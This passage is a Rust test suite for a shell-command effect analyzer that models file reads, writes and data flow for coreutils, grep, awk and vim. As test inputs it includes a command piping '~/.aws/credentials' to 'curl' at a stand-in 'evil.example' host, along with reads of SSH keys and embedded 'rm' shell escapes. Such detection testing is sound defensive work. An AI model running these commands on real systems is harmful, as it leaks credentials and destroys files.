//! Coverage for the coreutils reader/writer models in
//! `crates/effinterp-engine/src/models/coreutils.rs`: the common file-reading
//! commands (cat, sort, wc, grep, less, more, base64) plus a few
//! spot-checks on the acceptance examples for commands modeled elsewhere
//! (cp, find, chmod) to confirm they still compose correctly.

use effinterp_engine::Engine;
use effinterp_proto::{
    AttrValue, CoverageLevel, Domain, Plan, ResourceExpr, ResourceIdentity, Subject, validate_plan,
};

fn analyze(argv: &[&str], cwd: Option<&str>) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Exec {
            argv: argv.iter().map(|s| s.to_string()).collect(),
            cwd: cwd.map(|s| s.to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {argv:?}: {e:?}"));
    plan
}

fn analyze_shell(source: &str, cwd: Option<&str>) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.to_string(),
            cwd: cwd.map(str::to_string),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    plan
}

fn render(expr: &ResourceExpr) -> String {
    match expr {
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path },
        } => path.clone(),
        other => format!("{other:?}"),
    }
}

fn resources(plan: &Plan, op: &str) -> Vec<String> {
    plan.effects
        .iter()
        .filter(|e| e.operation.0 == op)
        .map(|e| render(&e.resource))
        .collect()
}

fn has_effect(plan: &Plan, op: &str, resource: &str) -> bool {
    resources(plan, op).iter().any(|r| r == resource)
}

fn has_boundary(plan: &Plan, reason: &str) -> bool {
    plan.boundaries.iter().any(|b| b.reason.as_str() == reason)
}

fn attr(plan: &Plan, op: &str, key: &str) -> Option<AttrValue> {
    plan.effects
        .iter()
        .find(|e| e.operation.0 == op)
        .and_then(|e| e.attributes.get(key).cloned())
}

fn attr_for(plan: &Plan, op: &str, resource: &str, key: &str) -> Option<AttrValue> {
    plan.effects
        .iter()
        .find(|e| e.operation.0 == op && render(&e.resource) == resource)
        .and_then(|e| e.attributes.get(key).cloned())
}

fn stdout_reads(plan: &Plan) -> Vec<(String, effinterp_proto::CausalAssurance)> {
    use effinterp_proto::{OccurrenceKind, Port};
    let graph = plan.causality.graph.as_ref().unwrap();
    graph
        .edges
        .iter()
        .filter_map(|edge| {
            let from = graph.nodes.iter().find(|node| node.id == edge.from)?;
            let to = graph.nodes.iter().find(|node| node.id == edge.to)?;
            match (&from.occurrence, &to.occurrence) {
                (
                    OccurrenceKind::ResourceInteraction {
                        operation,
                        resource,
                        ..
                    },
                    OccurrenceKind::Port { port: Port::Stdout },
                ) if operation.as_str() == "filesystem.read" && from.execution == to.execution => {
                    Some((render(resource), edge.assurance))
                }
                _ => None,
            }
        })
        .collect()
}

fn operation_reaches(plan: &Plan, from: &str, to: &str) -> bool {
    let graph = plan.causality.graph.as_ref().unwrap();
    let starts: Vec<_> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == from =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    let targets: std::collections::BTreeSet<_> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == to =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    starts.into_iter().any(|start| {
        let mut seen = std::collections::BTreeSet::from([start.clone()]);
        let mut pending = std::collections::VecDeque::from([start]);
        while let Some(node) = pending.pop_front() {
            if targets.contains(&node) {
                return true;
            }
            for edge in graph.edges.iter().filter(|edge| edge.from == node) {
                if seen.insert(edge.to.clone()) {
                    pending.push_back(edge.to.clone());
                }
            }
        }
        false
    })
}

#[test]
fn cat_reads_file_operand() {
    let plan = analyze(&["cat", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/a.txt", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    assert!(!has_boundary(&plan, "unmodeled_command"));
    use effinterp_proto::CausalAssurance::Exact;
    for source in [
        "cat /home/*/.aws/credentials",
        "cat ./secrets*",
        "cat -- $FILES",
        "cat -- -*",
    ] {
        let plan = analyze_shell(source, Some("/w"));
        assert!(
            stdout_reads(&plan)
                .iter()
                .any(|(_, assurance)| *assurance == Exact),
            "{source}"
        );
    }
    for source in [
        "cat $OPTIONS a.txt",
        "cat -* a.txt",
        "cat * a.txt",
        "cat --unknown a.txt",
    ] {
        let plan = analyze_shell(source, Some("/w"));
        assert!(
            stdout_reads(&plan)
                .iter()
                .all(|(_, assurance)| *assurance != Exact),
            "{source}"
        );
    }
    for flag in [
        "-A",
        "--number-nonblank",
        "-e",
        "-E",
        "-n",
        "-s",
        "-t",
        "-T",
        "-u",
        "-v",
        "-benstuv",
    ] {
        let plan = analyze(&["cat", flag, "a.txt"], Some("/w"));
        assert!(plan.boundaries.is_empty(), "{flag}");
        assert_eq!(
            stdout_reads(&plan),
            vec![("/w/a.txt".into(), Exact)],
            "{flag}"
        );
    }
}

#[test]
fn reader_file_operands_are_program_inputs_but_stdin_is_not() {
    for command in ["head", "tail"] {
        let plan = analyze(&[command, "a.txt"], Some("/w"));
        assert_eq!(
            attr_for(&plan, "filesystem.read", "/w/a.txt", "access_purpose"),
            Some(AttrValue::String("program_input".into())),
            "{command}"
        );
    }
    let plan = analyze(&["cat"], Some("/w"));
    assert!(resources(&plan, "filesystem.read").is_empty());
    for (source, exact) in [
        ("rg needle /home/*/.aws/credentials", true),
        ("rg needle -- $FILES", true),
        ("rg $QUERY -- /home/*", false),
        ("rg -- $QUERY /home/*", false),
        ("rg needle $OPTIONS /home/*", false),
    ] {
        let plan = analyze_shell(source, Some("/w"));
        assert_eq!(
            stdout_reads(&plan)
                .iter()
                .any(|(_, assurance)| *assurance == effinterp_proto::CausalAssurance::Exact),
            exact,
            "{source}"
        );
    }
    for flag in ["-l", "--files-with-matches", "-c", "--count", "--files"] {
        let plan = analyze(&["rg", flag, "needle", "a.txt"], Some("/w"));
        assert!(stdout_reads(&plan).is_empty(), "{flag}");
    }
    for (argv, output_mode) in [
        (&["rg", "--only-matching", "needle", "a.txt"][..], "content"),
        (
            &["rg", "--files-without-match", "needle", "a.txt"][..],
            "filenames",
        ),
        (&["rg", "--count-matches", "needle", "a.txt"][..], "count"),
        (&["rg", "--quiet", "needle", "a.txt"][..], "count"),
        (&["rg", "--files"][..], "filenames"),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "filesystem.read", "output_mode"),
            Some(AttrValue::String(output_mode.into())),
            "{argv:?}"
        );
    }
}

#[test]
fn sort_reads_input_writes_output_flag() {
    let plan = analyze(&["sort", "-o", "out.txt", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert!(has_effect(&plan, "filesystem.write", "/w/out.txt"));
    // -o's value is not also read as an input file.
    assert!(!has_effect(&plan, "filesystem.read", "/w/out.txt"));
}

#[test]
fn sort_random_source_is_read_only_for_a_random_ordering() {
    for argv in [
        &["sort", "-R", "--random-source", "seed", "a.txt"][..],
        &["sort", "--sort=random", "--random-source=seed", "a.txt"],
        &["sort", "-k1,1R", "--random-source", "seed", "a.txt"],
        &["sort", "-R", "-k1,1", "--random-source", "seed", "a.txt"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "filesystem.read", "/w/seed"), "{argv:?}");
    }
    // An explicitly ordered key does not inherit the global `-R`.
    for argv in [
        &["sort", "--random-source", "seed", "a.txt"][..],
        &["sort", "-R", "-k1,1n", "--random-source=seed", "a.txt"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(!has_effect(&plan, "filesystem.read", "/w/seed"), "{argv:?}");
    }
}

#[test]
fn sort_key_flag_does_not_swallow_operand() {
    // -k takes a field spec, not a path; the file operand must survive.
    let plan = analyze(&["sort", "-k", "2,2", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
}

#[test]
fn sort_temporary_directories_are_writes_not_input_operands() {
    for (argv, directory, input) in [
        (&["sort", "-T", "tmp", "a.txt"][..], "/w/tmp", "/w/a.txt"),
        (
            &["sort", "--temporary-directory=cache", "b.txt"][..],
            "/w/cache",
            "/w/b.txt",
        ),
        (
            &["sort", "--temporary-directory", "scratch", "c.txt"][..],
            "/w/scratch",
            "/w/c.txt",
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "filesystem.write", directory), "{argv:?}");
        assert!(has_effect(&plan, "filesystem.read", input), "{argv:?}");
        assert!(!has_effect(&plan, "filesystem.read", directory), "{argv:?}");
        assert_eq!(
            plan.coverage.0[&Domain::new("filesystem")].level,
            CoverageLevel::Partial,
            "{argv:?}"
        );
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary.reason.as_str() == "model_coverage"
                    && boundary
                        .affected_resource
                        .as_ref()
                        .is_some_and(|resource| render(resource) == directory)
            }),
            "{argv:?}"
        );
    }
}

#[test]
fn sort_files0_control_is_program_input_without_claiming_indirect_content() {
    let plan = analyze(&["sort", "--files0-from=list"], Some("/w"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/list"]);
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/list", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    assert!(has_boundary(&plan, "model_coverage"));

    let stdin = analyze(&["sort", "--files0-from=-"], Some("/w"));
    assert!(resources(&stdin, "filesystem.read").is_empty());
    assert!(has_boundary(&stdin, "model_coverage"));

    let reversed = analyze(&["sort", "--files0-from=list", "--reverse"], Some("/w"));
    assert_eq!(
        attr_for(&reversed, "filesystem.read", "/w/list", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );

    for argv in [
        &["sort", "--files0-from=list", "input.txt"][..],
        &["sort", "--files0-from"][..],
        &["sort", "--files0-from="][..],
        &["sort", "--reverse=garbage", "--files0-from=list"][..],
    ] {
        let invalid = analyze(argv, Some("/w"));
        assert!(
            resources(&invalid, "filesystem.read").is_empty(),
            "{argv:?}"
        );
        assert!(has_boundary(&invalid, "unrecognized_arguments"), "{argv:?}");
    }

    let conflicting = analyze(&["sort", "-n", "-h", "--files0-from=list"], Some("/w"));
    assert!(has_effect(&conflicting, "filesystem.read", "/w/list"));
    assert_eq!(
        attr_for(&conflicting, "filesystem.read", "/w/list", "access_purpose"),
        None
    );
    assert!(has_boundary(&conflicting, "unrecognized_arguments"));

    let unreviewed = analyze(
        &["sort", "--files0-from=list", "--parallel=garbage"],
        Some("/w"),
    );
    assert_eq!(
        attr_for(&unreviewed, "filesystem.read", "/w/list", "access_purpose"),
        None
    );
}

#[test]
fn wc_reads_file_operands() {
    let plan = analyze(&["wc", "-l", "a.txt", "b.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert!(has_effect(&plan, "filesystem.read", "/w/b.txt"));
}

#[test]
fn grep_skips_pattern_reads_files() {
    let plan = analyze(&["grep", "needle", "a.txt", "b.txt"], Some("/w"));
    assert!(!has_effect(&plan, "filesystem.read", "/w/needle"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert!(has_effect(&plan, "filesystem.read", "/w/b.txt"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/a.txt", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
}

#[test]
fn grep_dash_e_makes_all_operands_files() {
    let plan = analyze(&["grep", "-e", "needle", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/a.txt"]);
}

#[test]
fn grep_pattern_file_is_read_too() {
    let plan = analyze(&["grep", "-f", "patterns.txt", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/patterns.txt"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
}

#[test]
fn grep_control_files_are_program_inputs_and_control_dash_is_stdin() {
    for (argv, control) in [
        (
            &["grep", "-f", "patterns.txt", "a.txt"][..],
            "/w/patterns.txt",
        ),
        (
            &[
                "grep",
                "--ignore-case",
                "--exclude-from",
                ".env",
                "needle",
                "src",
            ][..],
            "/w/.env",
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr_for(&plan, "filesystem.read", control, "access_purpose"),
            Some(AttrValue::String("program_input".into())),
            "{argv:?}"
        );
        assert_eq!(
            attr_for(&plan, "filesystem.read", control, "content_filter"),
            Some(AttrValue::Bool(true)),
            "{argv:?}"
        );
        let reads = stdout_reads(&plan);
        assert_eq!(reads.len(), 1, "{argv:?}: {reads:?}");
        assert_ne!(reads[0].0, control);
        assert_eq!(reads[0].1, effinterp_proto::CausalAssurance::Exact);
    }

    let pattern_stdin = analyze(&["grep", "-f", "-", "a.txt"], Some("/w"));
    assert!(!has_effect(&pattern_stdin, "filesystem.read", "/w/-"));
    assert_eq!(
        attr_for(
            &pattern_stdin,
            "filesystem.read",
            "/w/a.txt",
            "access_purpose"
        ),
        Some(AttrValue::String("program_input".into()))
    );

    let exclusion_stdin = analyze(&["grep", "--exclude-from=-", "needle", "a.txt"], Some("/w"));
    assert!(!has_effect(&exclusion_stdin, "filesystem.read", "/w/-"));
    assert_eq!(
        attr_for(
            &exclusion_stdin,
            "filesystem.read",
            "/w/a.txt",
            "access_purpose"
        ),
        Some(AttrValue::String("program_input".into()))
    );
}

#[test]
fn grep_invalid_control_grammar_does_not_certify_program_inputs() {
    let missing = analyze(&["grep", "-f"], Some("/w"));
    assert!(resources(&missing, "filesystem.read").is_empty());
    assert!(has_boundary(&missing, "unrecognized_arguments"));

    for argv in [
        &["grep", "-f", "", "a.txt"][..],
        &["grep", "--exclude-from=", "needle", "a.txt"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(!has_effect(&plan, "filesystem.read", "/w"), "{argv:?}");
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }

    let invalid_attached = analyze(
        &[
            "grep",
            "--ignore-case=garbage",
            "--exclude-from=.env",
            "TODO",
            "file",
        ],
        Some("/w"),
    );
    assert!(resources(&invalid_attached, "filesystem.read").is_empty());
    assert!(has_boundary(&invalid_attached, "unrecognized_arguments"));

    let earlier_control = analyze(
        &[
            "grep",
            "--exclude-from=.env",
            "--ignore-case=garbage",
            "TODO",
            "file",
        ],
        Some("/w"),
    );
    assert!(has_effect(&earlier_control, "filesystem.read", "/w/.env"));
    assert_eq!(
        attr_for(
            &earlier_control,
            "filesystem.read",
            "/w/.env",
            "access_purpose"
        ),
        None
    );
    assert!(!has_effect(&earlier_control, "filesystem.read", "/w/file"));
    assert!(has_boundary(&earlier_control, "unrecognized_arguments"));

    for argv in [
        &["grep", "-E", "-F", "-f", "patterns.txt", "a.txt"][..],
        &[
            "grep",
            "--extended-regexp",
            "--fixed-strings",
            "-f",
            "patterns.txt",
            "a.txt",
        ][..],
        &["grep", "-G", "--perl-regexp", "-f", "patterns.txt", "a.txt"][..],
    ] {
        let conflict = analyze(argv, Some("/w"));
        assert!(
            has_boundary(&conflict, "unrecognized_arguments"),
            "{argv:?}"
        );
        assert_eq!(
            attr_for(
                &conflict,
                "filesystem.read",
                "/w/patterns.txt",
                "access_purpose"
            ),
            None,
            "{argv:?}"
        );
        assert_eq!(
            attr_for(&conflict, "filesystem.read", "/w/a.txt", "access_purpose"),
            None,
            "{argv:?}"
        );
    }

    for matcher in ["-E", "--extended-regexp"] {
        let valid_matcher = analyze(&["grep", matcher, "needle", "a.txt"], Some("/w"));
        assert_eq!(
            attr_for(
                &valid_matcher,
                "filesystem.read",
                "/w/a.txt",
                "access_purpose"
            ),
            Some(AttrValue::String("program_input".into())),
            "{matcher}"
        );
        assert!(valid_matcher.boundaries.is_empty(), "{matcher}");
    }

    for argv in [
        &["egrep", "-F", "-f", "patterns.txt", "a.txt"][..],
        &["grep", "--max-count=garbage", "-f", "patterns.txt", "a.txt"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr_for(
                &plan,
                "filesystem.read",
                "/w/patterns.txt",
                "access_purpose"
            ),
            None,
            "{argv:?}"
        );
        assert!(!plan.boundaries.is_empty(), "{argv:?}");
    }
}

#[test]
fn grep_family_reads_are_content_filters() {
    for command in ["grep", "egrep", "fgrep"] {
        let plan = analyze(&[command, "-r", "needle", "src"], Some("/w"));
        assert_eq!(
            attr(&plan, "filesystem.read", "content_filter"),
            Some(AttrValue::Bool(true)),
            "{command}"
        );
        assert!(!has_boundary(&plan, "unmodeled_command"), "{command}");
        assert_eq!(
            attr(&plan, "filesystem.read", "query"),
            Some(AttrValue::String("needle".into()))
        );
        assert_eq!(
            attr(&plan, "filesystem.read", "output_mode"),
            Some(AttrValue::String("content".into()))
        );
        assert_eq!(
            stdout_reads(&plan),
            vec![("/w/src".into(), effinterp_proto::CausalAssurance::Exact)]
        );
    }
    for flag in [
        "-c",
        "--count",
        "-l",
        "--files-with-matches",
        "-L",
        "--files-without-match",
        "-q",
        "--quiet",
    ] {
        let plan = analyze(&["grep", flag, "needle", "a.txt"], Some("/w"));
        assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
        assert!(stdout_reads(&plan).is_empty(), "{flag}");
    }
    for (source, exact) in [
        ("grep needle /home/*/.aws/credentials", true),
        ("grep needle -- $FILES", true),
        ("grep $QUERY -- a.txt", false),
        ("grep needle $OPTIONS a.txt", false),
        ("grep --binary-files=$MODE needle a.txt", false),
    ] {
        let plan = analyze_shell(source, Some("/w"));
        assert_eq!(
            stdout_reads(&plan)
                .iter()
                .any(|(_, assurance)| *assurance == effinterp_proto::CausalAssurance::Exact),
            exact,
            "{source}"
        );
    }
    let plan = analyze(
        &["grep", "-e", "first", "-e", "second", "a.txt"],
        Some("/w"),
    );
    assert_eq!(
        attr(&plan, "filesystem.read", "query"),
        Some(AttrValue::String("first\nsecond".into()))
    );
    let recursive = analyze(&["grep", "-r", "needle"], Some("/w"));
    let graph = recursive.causality.graph.as_ref().unwrap();
    assert!(!graph.edges.iter().any(|edge| {
        edge.assurance == effinterp_proto::CausalAssurance::Exact
            && graph.nodes.iter().any(|node| {
                node.id == edge.from
                    && matches!(
                        node.occurrence,
                        effinterp_proto::OccurrenceKind::Port {
                            port: effinterp_proto::Port::Stdin
                        }
                    )
            })
            && graph.nodes.iter().any(|node| {
                node.id == edge.to
                    && matches!(
                        node.occurrence,
                        effinterp_proto::OccurrenceKind::Port {
                            port: effinterp_proto::Port::Stdout
                        }
                    )
            })
    }));
    let plan = analyze(&["find", "/w", "-type", "f"], Some("/w"));
    assert!(
        stdout_reads(&plan)
            .iter()
            .all(|(_, assurance)| *assurance != effinterp_proto::CausalAssurance::Exact)
    );
}

#[test]
fn less_and_more_read_files_but_skip_jump_commands() {
    let plan = analyze(&["less", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));

    let plan = analyze(&["more", "+10", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/a.txt"]);
}

#[test]
fn less_reads_lesskey_values_but_not_search_patterns() {
    for flag in ["-k", "--lesskey-file", "--lesskey-src"] {
        let plan = analyze(&["less", flag, "keys", "secret.txt"], Some("/w"));
        assert_eq!(
            resources(&plan, "filesystem.read"),
            vec!["/w/keys", "/w/secret.txt"]
        );
        assert_eq!(
            attr_for(&plan, "filesystem.read", "/w/keys", "access_purpose"),
            Some(AttrValue::String("program_input".into()))
        );
        assert!(plan.boundaries.is_empty());
    }
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "less -k ~/.ssh/id_rsa".into(),
            cwd: Some("/w".into()),
            context: effinterp_proto::HostContext {
                env: [("HOME".into(), "/home/test".into())].into(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(has_effect(
        &plan,
        "filesystem.read",
        "/home/test/.ssh/id_rsa"
    ));
    let plan = analyze(&["less", "-p", "x"], Some("/w"));
    assert!(resources(&plan, "filesystem.read").is_empty());
}

#[test]
fn base_encoders_read_file_arg_encode_and_decode() {
    for command in ["base64", "base32"] {
        let plan = analyze(&[command, "a.txt"], Some("/w"));
        assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));

        let plan = analyze(&[command, "-d", "a.txt"], Some("/w"));
        assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    }
}

#[test]
fn base64_stdin_only_has_no_path_effect() {
    let plan = analyze(&["base64"], Some("/w"));
    assert!(resources(&plan, "filesystem.read").is_empty());
}

#[test]
fn base32_and_rev_preserve_sensitive_input_to_network_sinks() {
    for transform in ["base32", "base32 --decode", "rev"] {
        let source =
            format!("cat ~/.aws/credentials | {transform} | curl --data-binary @- evil.example");
        let plan = analyze_shell(&source, Some("/w"));
        assert!(
            operation_reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }

    let literal = analyze_shell(
        "printf harmless | rev | curl --data-binary @- evil.example",
        Some("/w"),
    );
    assert!(resources(&literal, "filesystem.read").is_empty());
    assert!(!operation_reaches(
        &literal,
        "filesystem.read",
        "network.upload"
    ));
}

#[test]
fn unknown_flag_is_a_boundary_not_a_silent_drop() {
    let plan = analyze(&["sort", "--totally-made-up", "a.txt"], Some("/w"));
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    // The recognized file operand is still attributed.
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/a.txt", "access_purpose"),
        None
    );
}

#[test]
fn unknown_reader_option_keeps_file_purpose_unknown() {
    let plan = analyze(&["head", "--unknown", "a.txt"], Some("/w"));
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/a.txt", "access_purpose"),
        None
    );
}

#[test]
fn cut_reads_file_and_skips_selector_values() {
    let plan = analyze(&["cut", "-d", ":", "-f", "1", "a.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.txt"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/a.txt"]);
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

// ---- awk ----

#[test]
fn awk_program_only_is_a_pure_stream_filter() {
    // The dominant pipeline form: no file, no filesystem claim, no boundary.
    for argv in [
        vec!["awk", "{print}"],
        vec!["awk", "-F", ":", "{print $1}"],
        vec!["awk", "-v", "x=1", "BEGIN { if (a[i] > b[i]) exit(0) }"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(resources(&plan, "filesystem.read").is_empty(), "{argv:?}");
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn awk_reads_file_operands_but_not_assignments() {
    let plan = analyze(&["awk", "{print $2}", "data.txt", "count=1"], Some("/w"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/data.txt"]);
}

#[test]
fn awk_in_place_rewrites_only_file_operands() {
    for argv in [
        &["gawk", "-i", "inplace", "{ print }", "data", "count=1"][..],
        &["awk", "-iinplace", "{ print }", "data"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/data"]);
        assert_eq!(resources(&plan, "filesystem.write"), vec!["/w/data"]);
        assert!(!has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
}

#[test]
fn patch_and_vim_distinguish_inputs_from_write_targets() {
    let patch = analyze(&["patch", "target", "fix.patch"], Some("/w"));
    assert_eq!(
        resources(&patch, "filesystem.read"),
        vec!["/w/fix.patch", "/w/target"]
    );
    assert_eq!(resources(&patch, "filesystem.write"), vec!["/w/target"]);

    for editor in ["vim", "vi", "nvim"] {
        let write = analyze(&[editor, "-es", "-c", "wq", "target"], Some("/w"));
        assert_eq!(resources(&write, "filesystem.read"), vec!["/w/target"]);
        assert_eq!(resources(&write, "filesystem.write"), vec!["/w/target"]);
        let read = analyze(&[editor, "target"], Some("/w"));
        assert_eq!(resources(&read, "filesystem.read"), vec!["/w/target"]);
        assert!(resources(&read, "filesystem.write").is_empty());
    }
}

#[test]
fn vim_ex_commands_are_read_or_keep_a_boundary() {
    // A shell escape runs the rest of its line, `|` included, in the shell.
    for command in ["!rm x | cat", "silent !rm x", ":w !rm x", "%!rm x"] {
        let plan = analyze(&["vim", "-es", "-c", command, "target"], Some("/w"));
        assert!(has_effect(&plan, "filesystem.delete", "/w/x"), "{command}");
    }
    let plan = analyze(&["vim", "--cmd", "!rm x", "target"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.delete", "/w/x"));

    // A write that names a file writes that file, not the edited one.
    for command in [
        "w out",
        "w! out",
        "1,5write >> out",
        "saveas out",
        "sil up out|q",
    ] {
        let plan = analyze(&["vim", "-es", "-c", command, "target"], Some("/w"));
        assert_eq!(
            resources(&plan, "filesystem.write"),
            vec!["/w/out"],
            "{command}"
        );
        assert!(!has_boundary(&plan, "unparsed_script"), "{command}");
    }
    // `-m` disables writes but not the shell.
    let plan = analyze(&["vim", "-m", "-c", "w out", "target"], Some("/w"));
    assert!(resources(&plan, "filesystem.write").is_empty());

    // Line jumps, searches and quits have no effect outside the editor.
    for command in ["42", "$", "/needle", "q!", "qa", "wq"] {
        let plan = analyze(&["vim", "-c", command, "target"], Some("/w"));
        assert!(!has_boundary(&plan, "unparsed_script"), "{command}");
    }
    // Any other command, or a file name Vim expands, keeps a boundary.
    for command in [
        "source x.vim",
        "%s/a/b/e",
        "call system('id')",
        "w %.bak",
        "r !id",
    ] {
        let plan = analyze(&["vim", "-es", "-c", command, "target"], Some("/w"));
        assert!(has_boundary(&plan, "unparsed_script"), "{command}");
    }
}

#[test]
fn awk_literal_commands_are_shell_source_and_others_a_boundary() {
    for program in [
        "{ system(\"rm x\") }",
        "{ system (\"rm x\") }",
        "{ \"rm x\" | getline out }",
        "{ print | \"rm x\" }",
    ] {
        let plan = analyze(&["awk", program, "f"], Some("/w"));
        assert!(has_effect(&plan, "filesystem.delete", "/w/x"), "{program}");
        assert!(has_effect(&plan, "filesystem.read", "/w/f"), "{program}");
        assert!(!has_boundary(&plan, "unparsed_script"), "{program}");
    }
    for program in [
        "{ system(cmd) }",
        "{ cmd | getline out }",
        "{ print | cmd }",
    ] {
        let plan = analyze(&["awk", program, "f"], Some("/w"));
        assert!(has_boundary(&plan, "unparsed_script"), "{program}");
    }
}

#[test]
fn awk_getline_and_output_redirections_name_their_files() {
    let plan = analyze(
        &[
            "awk",
            "{ while ((getline line < \"x\") > 0) print line > \"y\"; print ($1 > $2) >> \"z\" }",
        ],
        Some("/w"),
    );
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/x"]);
    assert_eq!(resources(&plan, "filesystem.write"), vec!["/w/y", "/w/z"]);
    assert_eq!(
        attr_for(&plan, "filesystem.write", "/w/z", "append"),
        Some(AttrValue::Bool(true))
    );
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    // Any lvalue, including a computed field, still reads the named file.
    let plan = analyze(&["awk", "{ getline $(1) < \"x\"; print }"], Some("/w"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/x"]);
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    for program in [
        "{ getline line < f }",
        "{ print > $1 }",
        "{ print > \"a\" n }",
        "BEGIN { ARGV[1] = \"x\"; ARGC = 2 } 1",
        "BEGIN { split(\"x\", ARGV) } 1",
        "BEGIN { getline ARGV[1] < \"list\" } 1",
    ] {
        let plan = analyze(&["awk", program], Some("/w"));
        assert!(has_boundary(&plan, "unparsed_script"), "{program}");
    }
}

#[test]
fn awk_program_file_is_read_and_bounded() {
    for argv in [
        &["awk", "-f", "prog.awk", "data"][..],
        &["mawk", "-W", "exec", "prog.awk", "data"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            has_effect(&plan, "filesystem.read", "/w/prog.awk"),
            "{argv:?}"
        );
        assert!(has_effect(&plan, "filesystem.read", "/w/data"), "{argv:?}");
        assert!(has_boundary(&plan, "unparsed_script"), "{argv:?}");
    }
}

// ---- inert commands ----

#[test]
fn inert_commands_have_no_effects_or_boundaries() {
    for argv in [
        vec!["tr", "-d", "x"],
        vec!["tr", "[:upper:]", "[:lower:]"],
        vec!["tput", "-T", "xterm", "colors"],
        vec!["uname", "-m"],
        vec!["sleep", "5"],
        vec!["true"],
        vec!["false"],
        vec!["basename", "/a/b"],
        vec!["dirname", "/a/b"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        // The exec of the command itself is the only effect.
        assert_eq!(
            plan.effects
                .iter()
                .filter(|e| e.operation.0 != "process.exec")
                .count(),
            0,
            "{argv:?}"
        );
    }
}

// ---- spot-checks on the acceptance examples (commands modeled elsewhere
// in fsutils.rs / sysutils.rs / archive.rs) ----

#[test]
fn cp_reads_source_writes_dest() {
    let plan = analyze(&["cp", "a", "b"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/a", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    assert!(has_effect(&plan, "filesystem.write", "/w/b"));
}

/// A cross-filesystem move copies the contents before removing the source, so
/// every `mv` source is a possible program input. `mv` has no link-only mode
